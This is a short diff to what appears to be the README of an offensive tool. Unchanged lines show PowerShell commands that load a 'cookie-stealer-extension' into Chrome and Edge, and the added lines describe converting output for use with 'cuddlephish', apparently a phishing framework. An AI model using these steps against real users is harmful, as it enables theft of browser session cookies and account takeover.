@@ -57,3 +57,9 @@ start-process chrome.exe -ArgumentList '--load-extension=C:\Path\To\cookie-steal
 start-process msedge.exe -ArgumentList '--load-extension=C:\Path\To\cookie-stealer-extension https://google.com'
 
 ```
+
+2. Convert to cuddlephish
+```
+python converter.py -h
+Usage: python converter.py <input_file>
+```
